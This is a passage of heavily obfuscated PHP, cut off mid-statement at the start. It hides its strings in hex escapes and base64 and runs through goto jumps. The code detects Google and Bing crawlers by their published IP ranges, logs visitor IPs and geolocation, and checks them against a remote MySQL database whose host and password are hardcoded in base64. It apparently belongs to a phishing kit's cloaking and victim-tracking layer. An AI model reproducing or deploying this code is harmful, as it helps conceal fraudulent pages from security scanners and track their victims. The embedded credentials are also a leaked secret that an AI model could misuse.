$mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\377", $mask >> 3) . chr(255 << 8 - ($mask & 7)); return ($subnetBin & $maskBin) === ($ipBin & $maskBin); } goto c5Tjd; rQpNJ: error_reporting(E_ALL); goto D4Qvx; An8N3: function rand_num($length) { $characters = "\60\61\62\63\x34\x35\x36\67\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto SNUtR; yijU0: if (!empty($_SERVER["\x48\x54\124\x50\137\x43\114\111\x45\116\124\137\111\x50"])) { $ipAddress = $_SERVER["\x48\124\124\120\137\x43\x4c\111\105\116\124\x5f\111\120"]; } elseif (!empty($_SERVER["\110\x54\x54\120\137\130\137\x46\117\122\x57\101\x52\x44\105\x44\137\106\117\122"])) { $ipAddress = $_SERVER["\x48\x54\124\120\x5f\130\x5f\106\117\x52\x57\101\x52\x44\x45\x44\137\106\117\122"]; } else { $ipAddress = $_SERVER["\122\105\x4d\117\124\105\x5f\x41\x44\x44\x52"]; } goto mRP7U; SOSA2: $response = curl_exec($curl); goto XtYC9; NcRyF: $_SESSION["\126\x6f\x70\x72\x74"] = isset($info["\143\x69\x74\171"]) ? $info["\143\x69\164\171"] : null; goto VDliN; S6pjk: $donflag = $protocol . "\72\57\57" . $domain; goto Wc8W9; cEpp2: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\x6f\x6f\x67\154\145" => "\150\x74\164\x70\163\x3a\57\x2f\144\x65\166\x65\154\157\x70\x65\162\x73\x2e\x67\157\x6f\147\154\x65\56\143\x6f\155\x2f\163\145\141\x72\x63\x68\x2f\x61\160\x69\x73\x2f\151\x70\162\x61\156\x67\x65\163\x2f\147\x6f\157\x67\154\x65\x62\157\x74\x2e\152\163\157\x6e", "\142\151\156\147" => "\150\x74\x74\160\163\72\57\57\x77\167\167\x2e\142\151\156\147\x2e\143\x6f\x6d\57\x74\x6f\157\x6c\x62\x6f\170\x2f\142\151\156\x67\142\157\x74\x2e\152\163\157\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\x72\x65\x66\151\x78\145\163"] as $ipRange) { if (isset($ipRange["\x69\160\x76\x36\x50\162\145\146\151\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\151\160\166\x36\120\x72\x65\x66\151\x78"]; } elseif (isset($ipRange["\151\160\x76\64\120\162\145\146\x69\170"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\x69\x70\166\x34\x50\162\x65\x66\x69\x78"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto GHZGV; lgLF0: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\156\156\x65\x63\x74\x69\157\x6e\40\146\x61\x69\x6c\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\105\114\x45\103\124\40\x2a\x20\x46\122\117\115\x20\154\157\x67\163\40\127\110\105\x52\x45\x20\151\160\x61\144\x64\162\145\163\x3d\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto fcY4v; wAsA_: $datalog = base64_decode("\115\124\x6b\x34\114\x6a\111\x31\x4d\123\x34\64\116\103\x34\x79\115\104\x41"); goto nhioc; ZpRs2: $protocol = isset($_SERVER["\x48\x54\x54\x50\123"]) && $_SERVER["\x48\x54\x54\x50\x53"] === "\x6f\x6e" ? "\150\x74\x74\x70\163" : "\150\x74\x74\160"; goto NrYuq; CQCEq: $Lredsvv = base64_decode("\132\110\x4a\152\x5a\x32\x6c\163\145\x56\101\x77\x4b\155\x73\155"); goto WOlFv; CUI0S: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto TKKmc; VDliN: $_SESSION["\170\117\x70\165\171"] = isset($info["\162\145\x67\x69\x6f\156\x4e\x61\x6d\x65"]) ? $info["\162\145\147\x69\x6f\x6e\x4e\x61\155\145"] : null; goto dAz2j; ErPco: $_SESSION["\102\x6c\141\163\x61\x63\x6f\165\156"] = isset($info["\x63\157\165\x6e\164\x72\171"]) ? $info["\143\x6f\x75\156\164\162\171"] : null; goto VYP5S; ntkNj: if (isset($_POST["\x6c\157\x63\x61\x6c\151\160"])) { $myips = base64_decode(base64_decode($_POST["\154\157\143\141\x6c\151\160"])); $_SESSION["\154\x6f\154\x69\160\x73"] = $myips; $StrupLom = $myips; } goto cEpp2; OzkZm: ')); ?>
